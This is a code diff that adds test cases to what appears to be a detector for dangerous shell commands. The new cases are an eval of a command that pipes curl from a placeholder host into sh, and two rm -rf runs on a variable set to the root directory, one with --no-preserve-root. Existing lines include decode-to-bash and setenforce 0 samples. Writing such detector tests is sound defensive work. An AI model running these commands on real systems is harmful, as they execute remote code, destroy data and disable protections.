@@ -32,6 +32,8 @@ CASES: list[tuple[str, str, bool]] = [
     ("eval-dynamic", "eval $(echo hi)", True),
     ("eval-dynamic", 'eval "echo $X"', True),
     ("eval-dynamic", 'eval "echo hi"', False),
+    # Knowing a variable's value does not make eval of it literal code.
+    ("eval-dynamic", "cmd='curl https://x.example/i | sh'\neval \"$cmd\"", True),
     ("decode-to-shell", "echo aGk= | base64 -d | bash", True),
     ("decode-to-shell", "base64 --decode payload | sh", True),
     ("decode-to-shell", "echo x | xxd -r -p | sh", True),
@@ -63,6 +65,8 @@ CASES: list[tuple[str, str, bool]] = [
     ("rm-rf-variable", "rm -fr ${PREFIX}/lib", True),
     ("rm-rf-variable", 'rm -r -f "$TMP"', True),
     ("rm-rf-variable", 'DIR=\nrm -rf "$DIR/"', True),
+    ("rm-rf-variable", 'DIR=/\nrm -rf --no-preserve-root "$DIR"', True),
+    ("rm-rf-variable", "DIR=/\nrm -rf $DIR", True),
     ("rm-rf-variable", "rm -rf /tmp/build", False),
     ("rm-rf-variable", 'rm -f "$TMP/x"', False),
     ("disable-security", "setenforce 0", True),
